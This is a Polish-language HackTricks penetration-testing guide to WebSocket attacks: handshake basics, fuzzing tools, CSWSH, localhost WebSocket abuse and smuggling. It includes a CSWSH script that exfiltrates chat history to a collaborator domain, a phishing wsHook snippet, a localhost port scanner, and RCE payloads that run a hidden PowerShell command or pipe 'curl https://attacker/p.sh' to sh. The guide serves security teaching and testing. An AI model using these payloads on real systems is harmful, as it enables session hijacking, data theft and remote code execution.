# Ataki WebSocket

{{#include ../banners/hacktricks-training.md}}

## Czym są WebSockets

Połączenia WebSocket są ustanawiane poprzez początkowy **HTTP** handshake i są zaprojektowane jako **długotrwałe**, umożliwiając dwukierunkowe przesyłanie wiadomości w dowolnym momencie bez potrzeby systemu transakcyjnego. Dzięki temu WebSockets są szczególnie korzystne dla aplikacji wymagających **niskich opóźnień lub komunikacji inicjowanej przez serwer**, takich jak strumienie danych finansowych na żywo.

### Nawiązywanie połączeń WebSocket

Szczegółowe wyjaśnienie dotyczące nawiązywania połączeń WebSocket można znaleźć [**tutaj**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc). W skrócie, połączenia WebSocket są zwykle inicjowane za pomocą JavaScript po stronie klienta, jak pokazano poniżej:
```javascript
var ws = new WebSocket("wss://normal-website.com/ws")
```
Protokół `wss` oznacza połączenie WebSocket zabezpieczone przez **TLS**, natomiast `ws` wskazuje połączenie **unsecured**.

Podczas nawiązywania połączenia między przeglądarką a serwerem przez HTTP wykonywany jest handshake. Proces handshake polega na tym, że przeglądarka wysyła żądanie, a serwer odpowiada, jak pokazano w poniższych przykładach:

Przeglądarka wysyła żądanie handshake:
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
Odpowiedź serwera na handshake:
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
Po ustanowieniu połączenie pozostaje otwarte, umożliwiając wymianę wiadomości w obu kierunkach.

**Kluczowe punkty handshaku WebSocket:**

- Nagłówki `Connection` i `Upgrade` sygnalizują rozpoczęcie handshaku WebSocket.
- Nagłówek `Sec-WebSocket-Version` wskazuje żądaną wersję protokołu WebSocket, zwykle `13`.
- Losowa wartość zakodowana w Base64 jest wysyłana w nagłówku `Sec-WebSocket-Key`, zapewniając unikalność każdego handshaku, co pomaga zapobiegać problemom z proxy buforującymi. Ta wartość nie służy do uwierzytelniania, lecz potwierdza, że odpowiedź nie została wygenerowana przez źle skonfigurowany serwer lub cache.
- Nagłówek `Sec-WebSocket-Accept` w odpowiedzi serwera jest hashem `Sec-WebSocket-Key`, weryfikując intencję serwera otwarcia połączenia WebSocket.

Te elementy zapewniają, że proces handshaku jest bezpieczny i niezawodny, torując drogę do wydajnej komunikacji w czasie rzeczywistym.

### Konsola Linux

Możesz użyć `websocat`, aby ustanowić surowe połączenie WebSocket.
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
Albo utworzyć serwer websocat:
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
### MitM websocket połączenia

Jeśli stwierdzisz, że klienci są połączeni z **HTTP websocket** z twojej obecnej sieci lokalnej możesz spróbować [ARP Spoofing Attack ](../generic-methodologies-and-resources/pentesting-network/index.html#arp-spoofing) aby przeprowadzić atak MitM między klientem a serwerem.\
Gdy klient będzie próbował połączyć się z tobą, możesz wtedy użyć:
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
### Enumeracja Websockets

Możesz użyć **tool** [**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS) **do automatycznego odkrywania, fingerprintowania i wyszukiwania znanych** **vulnerabilities** w websockets.

### Narzędzia debugowania Websocket

- **Burp Suite** obsługuje komunikację websockets w trybie MitM w sposób bardzo podobny do tego, jak obsługuje zwykłą komunikację HTTP.
- Rozszerzenie [**socketsleuth**](https://github.com/snyk/socketsleuth) **Burp Suite extension** pozwala lepiej zarządzać komunikacją Websocket w Burp, uzyskując **history**, ustawiając **interception rules**, używając reguł **match and replace**, korzystając z **Intruder** i **AutoRepeater.**
- [**WSSiP**](https://github.com/nccgroup/wssip)**:** Skrót od "**WebSocket/Socket.io Proxy**", to narzędzie napisane w Node.js, udostępnia interfejs użytkownika do **capture, intercept, send custom** wiadomości oraz podglądu wszystkich komunikatów WebSocket i Socket.IO między klientem a serwerem.
- [**wsrepl**](https://github.com/doyensec/wsrepl) to **interactive websocket REPL** zaprojektowane specjalnie do penetration testing. Udostępnia interfejs do obserwacji **incoming websocket messages and sending new ones**, z prostym w użyciu frameworkiem do **automating** tej komunikacji.
- [**https://websocketking.com/**](https://websocketking.com/) to **aplikacja web do komunikacji** z innymi serwisami przy użyciu **websockets**.
- [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket) — pośród innych rodzajów komunikacji/protokołów, udostępnia **aplikację web do komunikacji** z innymi serwisami przy użyciu **websockets.**

## Odszyfrowywanie Websocket

- [https://github.com/Anof-cyber/PyCript](https://github.com/Anof-cyber/PyCript)
- [https://github.com/Anof-cyber/PyCript-WebSocket/](https://github.com/Anof-cyber/PyCript-WebSocket/)

## Laboratorium Websocket

W [**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course) znajdziesz kod do uruchomienia weba używającego websockets, a w [**this post**](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/) znajdziesz wyjaśnienie.

## Websocket Fuzzing

Rozszerzenie Burp [**Backslash Powered Scanner**](https://github.com/PortSwigger/backslash-powered-scanner) teraz pozwala również fuzzować wiadomości WebSocket. Więcej informacji znajdziesz [**here**](https://arete06.com/posts/fuzzing-ws/#adding-websocket-support-to-backslash-powered-scanner).

### WebSocket Turbo Intruder (Burp extension)

WebSocket Turbo Intruder od PortSwigger wprowadza Turbo Intruder–style Python scripting oraz high‑rate fuzzing do WebSockets. Zainstaluj go z BApp Store lub ze źródeł. Zawiera dwa komponenty:

- Turbo Intruder: high‑volume messaging do pojedynczego WS endpointu przy użyciu custom engines.
- HTTP Middleware: udostępnia lokalny HTTP endpoint, który przekazuje bodies jako wiadomości WS przez persistent connection, dzięki czemu każdy HTTP‑based scanner może probe WS backends.

Podstawowy wzorzec skryptu do fuzzowania WS endpointu i filtrowania istotnych odpowiedzi:
```python
def queue_websockets(upgrade_request, message):
connection = websocket_connection.create(upgrade_request)
for i in range(10):
connection.queue(message, str(i))

def handle_outgoing_message(websocket_message):
results_table.add(websocket_message)

@MatchRegex(r'{\"user\":\"Hal Pline\"')
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
Użyj dekoratorów takich jak `@MatchRegex(...)`, aby ograniczyć hałas, gdy pojedyncza wiadomość wywołuje wiele odpowiedzi.

### Bridge WS behind HTTP (HTTP Middleware)

Opakuj utrzymywane połączenie WS i przekazuj HTTP bodies jako wiadomości WS do automatycznego testowania za pomocą HTTP scanners:
```python
def create_connection(upgrade_request):
connection = websocket_connection.create(upgrade_request)
return connection

@MatchRegex(r'{\"user\":\"You\"')
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
Następnie wyślij HTTP lokalnie; treść jest przesyłana dalej jako wiadomość WS:
```http
POST /proxy?url=https%3A%2F%2Ftarget/ws HTTP/1.1
Host: 127.0.0.1:9000
Content-Length: 16

{"message":"hi"}
```
To pozwala sterować backendami WS, jednocześnie filtrując „interesujące” zdarzenia (np. SQLi errors, auth bypass, command injection behavior).

### Obsługa Socket.IO (handshake, heartbeats, events)

Socket.IO dodaje własne ramkowanie nad WS. Wykryjesz to po obowiązkowym parametrze query `EIO` (np. `EIO=4`). Utrzymuj sesję przy życiu za pomocą Ping (`2`) i Pong (`3`), rozpocznij konwersację od `"40"`, a następnie emituj eventy takie jak `42["message","hello"]`.

Intruder example:
```python
import burp.api.montoya.http.message.params.HttpParameter as HttpParameter

def queue_websockets(upgrade_request, message):
connection = websocket_connection.create(
upgrade_request.withUpdatedParameters(HttpParameter.urlParameter("EIO", "4")))
connection.queue('40')
connection.queue('42["message","hello"]')

@Pong("3")
def handle_outgoing_message(websocket_message):
results_table.add(websocket_message)

@PingPong("2", "3")
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
Wariant adaptera HTTP:
```python
import burp.api.montoya.http.message.params.HttpParameter as HttpParameter

def create_connection(upgrade_request):
connection = websocket_connection.create(
upgrade_request.withUpdatedParameters(HttpParameter.urlParameter("EIO", "4")))
connection.queue('40')
connection.decIn()
return connection

@Pong("3")
def handle_outgoing_message(websocket_message):
results_table.add(websocket_message)

@PingPong("2", "3")
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
### Wykrywanie server‑side prototype pollution przy użyciu Socket.IO

Stosując bezpieczną technikę wykrywania PortSwiggera, spróbuj zanieczyścić wewnętrzne elementy Express, wysyłając payload podobny do:
```json
{"__proto__":{"initialPacket":"Polluted"}}
```
Jeśli powitania lub zachowanie się zmieni (np. echo zawiera "Polluted"), prawdopodobnie doszło do zanieczyszczenia prototypów po stronie serwera. Wpływ zależy od osiągalnych sinks; skoreluj to z gadgets z sekcji Node.js prototype pollution. Zobacz:

- Check [NodeJS – __proto__ & prototype Pollution](deserialization/nodejs-proto-prototype-pollution/README.md) for sinks/gadgets and chaining ideas.

### WebSocket race conditions with Turbo Intruder

Domyślny engine grupuje wiadomości na jednym połączeniu (świetna przepustowość, słabe do wyścigów). Użyj silnika THREADED, aby wystartować wiele połączeń WS i wysyłać payloady równolegle, by wywołać race logiczne (double‑spend, token reuse, state desync). Zacznij od przykładowego skryptu i dostosuj concurrency w `config()`.

- Learn methodology and alternatives in [Race Condition](race-condition.md) (see “RC in WebSockets”).

### WebSocket DoS: malformed frame “Ping of Death”

Stwórz WS frames, których nagłówek deklaruje ogromną długość payloadu, ale nie wysyłaj ciała. Niektóre serwery WS ufają zadeklarowanej długości i pre‑alokują bufory; ustawienie jej blisko `Integer.MAX_VALUE` może spowodować Out‑Of‑Memory i zdalny unauth DoS. Zobacz przykładowy skrypt.

### CLI and debugging

- Headless fuzzing: `java -jar WebSocketFuzzer-<version>.jar <scriptFile> <requestFile> <endpoint> <baseInput>`
- Włącz WS Logger, aby przechwycić i skorelować wiadomości używając wewnętrznych ID.
- Użyj helperów `inc*`/`dec*` na `Connection`, aby dopracować obsługę ID wiadomości w złożonych adapterach.
- Dekoratory jak `@PingPong`/`@Pong` oraz helpery typu `isInteresting()` redukują szum i utrzymują sesje przy życiu.

### Operational safety

Fuzzing WS o wysokiej częstotliwości może otworzyć wiele połączeń i wysyłać tysiące wiadomości na sekundę. Sfałszowane ramki i wysokie tempo mogą powodować realny DoS. Stosuj tylko tam, gdzie masz pozwolenie.

## Cross-site WebSocket hijacking (CSWSH)

**Cross-site WebSocket hijacking**, znany także jako **cross-origin WebSocket hijacking**, to konkretny przypadek **[Cross-Site Request Forgery (CSRF)](csrf-cross-site-request-forgery.md)** dotyczący WebSocket handshakes. Ta luka pojawia się, gdy WebSocket handshakes uwierzytelniają wyłącznie za pomocą **HTTP cookies** bez **CSRF tokens** lub podobnych zabezpieczeń.

Atakujący mogą to wykorzystać, hostując **malicious web page**, która inicjuje cross-site WebSocket połączenie do podatnej aplikacji. W wyniku tego połączenie jest traktowane jako część sesji ofiary w aplikacji, wykorzystując brak ochrony CSRF w mechanizmie obsługi sesji.

Aby atak zadziałał, muszą być spełnione warunki:

- WebSocket **authentication musi być oparta na cookie**
- Cookie musi być dostępne z serwera atakującego (zwykle oznacza to **`SameSite=None`**) oraz brak włączonego **Firefox Total Cookie Protection** w Firefox i brak **blocked third-party cookies** w Chrome.
- websocket server nie może sprawdzać origin połączenia (albo to sprawdzenie musi dać się obejść)

Dodatkowo:

- Jeśli uwierzytelnianie opiera się na połączeniu lokalnym (do localhost lub do sieci lokalnej) atak **będzie możliwy**, ponieważ brak obecnie obowiązujących mechanizmów tego zabraniających (zobacz [more info here](https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/))

### Simple Attack

Zauważ, że przy nawiązywaniu połączenia websocket cookie jest wysyłane do serwera. Serwer może używać go do powiązania konkretnego użytkownika z jego websocket session na podstawie wysłanego cookie.

Jeśli na przykład websocket server odsyła historię konwersacji użytkownika po wysłaniu wiadomości z treścią "READY", to proste XSS, które nawiąże połączenie (cookie zostanie automatycznie wysłane, aby autoryzować użytkownika‑ofiarę) i wyśle "READY", będzie w stanie odzyskać historię konwersacji.
```html
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### Cross Origin + Cookie z inną subdomeną

W tym wpisie na blogu [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/) atakujący zdołał **execute arbitrary Javascript in a subdomain** domeny, w której zachodziła komunikacja przez Websocket. Ponieważ była to **subdomain**, **cookie** było **wysyłane**, a ponieważ **Websocket nie sprawdzał poprawnie Origin**, możliwe było komunikowanie się z nim i **ukraść tokeny**.

### Kradzież danych od użytkownika

Sklonuj aplikację webową, którą chcesz podszyć (np. pliki .html) i w skrypcie, w którym zachodzi komunikacja przez Websocket, dodaj ten kod:
```javascript
//This is the script tag to load the websocket hooker
;<script src="wsHook.js"></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function (data, url) {
var xhttp = new XMLHttpRequest()
xhttp.open("GET", "client_msg?m=" + data, true)
xhttp.send()
}
wsHook.after = function (messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest()
xhttp.open("GET", "server_msg?m=" + messageEvent.data, true)
xhttp.send()
return messageEvent
}
```
Pobierz teraz plik `wsHook.js` z [https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook) i zapisz go w folderze z plikami webowymi.\
Udostępniając aplikację webową i zmuszając użytkownika do połączenia się z nią, będziesz w stanie przechwycić wysyłane i odbierane wiadomości przez websocket:
```javascript
sudo python3 -m http.server 80
```
### Ochrona przed CSWSH

Atak CSWSH opiera się na tym, że **użytkownik połączy się z złośliwą stroną**, która **otworzy połączenie websocket** do strony, do której użytkownik jest już zalogowany, i uwierzytelni się w jego imieniu, ponieważ żądanie wyśle cookies użytkownika.

Obecnie bardzo łatwo zapobiec temu problemowi:

- **Websocket server checking the origin**: Serwer websocket powinien zawsze sprawdzać, skąd następuje połączenie, aby zapobiec łączeniu się nieoczekiwanych stron.
- **Authentication token**: Zamiast opierać uwierzytelnianie na cookie, połączenie websocket może bazować na tokenie generowanym przez serwer dla użytkownika, nieznanym dla atakującego (np. token anti-CSRF).
- **SameSite Cookie attribute**: Cookies z wartością `SameSite` ustawioną na `Lax` lub `Strict` nie będą wysyłane ze strony atakującej do serwera ofiary, więc uwierzytelnianie oparte na cookie nie zadziała. Zwróć uwagę, że Chrome domyślnie ustawia wartość **`Lax`** dla cookies bez określonej tej flagi, co zwiększa bezpieczeństwo domyślnie. Jednak przez pierwsze 2 minuty po utworzeniu cookie będzie ona miała wartość **`None`**, co czyni ją podatną w tym ograniczonym okresie (oczekuje się też, że to zachowanie zostanie w przyszłości zmienione).
- **Firefox Total Cookie Protection**: Total Cookie Protection izoluje cookies do strony, na której zostały utworzone. Każda strona ma własny podział przechowywania cookies, co uniemożliwia stronom trzecim łączenie historii przeglądania użytkownika. To sprawia, że **CSWSH jest bezużyteczny**, ponieważ strona atakującego nie będzie miała dostępu do cookies.
- **Chrome third-party cookies block**: To również może uniemożliwić wysłanie cookie uwierzytelnionego użytkownika do serwera websocket nawet przy `SameSite=None`.

### Nadużycia WebSocket na localhost i wykrywanie portów przez przeglądarkę

Desktop launchery często uruchamiają helpery (np. CurseForge's `CurseAgent.exe`), które wystawiają JSON-RPC WebSockets na `127.0.0.1:<random_port>`. Przeglądarka **nie wymusza SOP na gniazdach loopback**, więc każda strona może spróbować handshake. Jeśli agent akceptuje dowolne wartości `Origin` i pomija dodatkową autoryzację, powierzchnia IPC staje się zdalnie kontrolowalna bezpośrednio z JavaScript.

#### Enumeracja ujawnionych metod

Przechwyć legalną sesję, aby poznać kontrakt protokołu. CurseForge, na przykład, emituje ramki takie jak `{"type":"method","name":"minecraftTaskLaunchInstance","args":[{...}]}`, gdzie `name` to metoda RPC, a `args` zawiera uporządkowane obiekty (GUIDy, rozdzielczość, flagi itp.). Gdy ten schemat jest znany, możesz wywołać metody takie jak `createModpack`, `minecraftGetDefaultLocation` lub inne uprzywilejowane zadania bezpośrednio ze wstrzykniętej strony.

#### Wykrywanie portów przez przeglądarkę

Ponieważ helper binduje się do losowego wysokiego portu, exploit najpierw brutalnie przeszukuje localhost przez WebSockets. Przeglądarki oparte na Chromium tolerują ~16k nieudanych upgrade'ów zanim zacznie się throttling, co wystarcza do przeszukania zakresu portów efemerycznych; Firefox ma tendencję do crashowania lub zawieszania się po kilkuset niepowodzeniach, więc praktyczne PoC często celują w Chromium.

<details>
<summary>Minimalny skaner przeglądarki</summary>
```javascript
async function findLocalWs(start = 20000, end = 36000) {
for (let port = start; port <= end; port++) {
await new Promise((resolve) => {
const ws = new WebSocket(`ws://127.0.0.1:${port}/`);
let settled = false;
const finish = () => { if (!settled) { settled = true; resolve(); } };
ws.onerror = ws.onclose = finish;
ws.onopen = () => {
console.log(`Found candidate on ${port}`);
ws.close();
finish();
};
});
}
}
```
</details>

Gdy połączenie przejdzie handshake i zacznie zwracać dane specyficzne dla protokołu, ponownie użyj tego socketu do łańcucha RPC.

#### Chaining JSON-RPC methods into RCE

The CurseForge exploit chains two unauthenticated calls:

1. `createModpack` → zwraca nowy `MinecraftInstanceGuid` bez interakcji z użytkownikiem.
2. `minecraftTaskLaunchInstance` → uruchamia ten GUID, akceptując dowolne flagi JVM przez `AdditionalJavaArguments`.

JNI/JVM diagnostic options zapewniają wtedy gotowy prymityw RCE. Na przykład ogranicz metaspace, aby wymusić crash i wykorzystaj error hook do wykonania polecenia:
```
-XX:MaxMetaspaceSize=16m -XX:OnOutOfMemoryError="cmd.exe /c powershell -nop -w hidden -EncodedCommand ..."
```
Na systemach Unix po prostu zamień payload na `/bin/sh -c 'curl https://attacker/p.sh | sh'`. To działa nawet gdy nie możesz modyfikować kodu aplikacji — kontrola JVM CLI wystarczy.

Wzorzec „create resource → privileged launch” pojawia się często w aktualizatorach i launcherach. Za każdym razem, gdy metoda (1) zwraca identyfikator śledzony przez serwer, a metoda (2) wykonuje kod lub uruchamia proces z użyciem tego identyfikatora, sprawdź, czy można wstrzyknąć argumenty kontrolowane przez użytkownika.


## Race Conditions

Race Conditions in WebSockets również występują — [sprawdź te informacje, aby dowiedzieć się więcej](race-condition.md#rc-in-websockets).

## Inne podatności

Ponieważ Web Sockets są mechanizmem do **wysyłania danych po stronie serwera i klienta**, w zależności od tego, jak serwer i klient obsługują te dane, **Web Sockets mogą być wykorzystane do eksploatacji wielu innych podatności, takich jak XSS, SQLi lub jakiekolwiek inne typowe web vuln przy użyciu danych wejściowych użytkownika z websocketu.**

## **WebSocket Smuggling**

Ta podatność może pozwolić na **obejście ograniczeń reverse proxies** poprzez sprawienie, że uwierzą, iż **websocket communication was stablished** (nawet jeśli to nieprawda). To może pozwolić atakującemu na **access hidden endpoints**. Po więcej informacji sprawdź następującą stronę:


{{#ref}}
h2c-smuggling.md
{{#endref}}

## References

- [https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages)
- [https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/](https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocket Turbo Intruder – BApp Store](https://portswigger.net/bappstore/ba292c5982ea426c95c9d7325d9a1066)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [Turbo Intruder background](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack)
- [Server-side prototype pollution – safe detection methods](https://portswigger.net/research/server-side-prototype-pollution#safe-detection-methods-for-manual-testers)
- [WS RaceCondition PoC (Java)](https://github.com/redrays-io/WS_RaceCondition_PoC)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)
- [PingOfDeathExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/PingOfDeathExample.py)
- [When WebSockets Lead to RCE in CurseForge](https://elliott.diy/blog/curseforge/)

{{#include ../banners/hacktricks-training.md}}
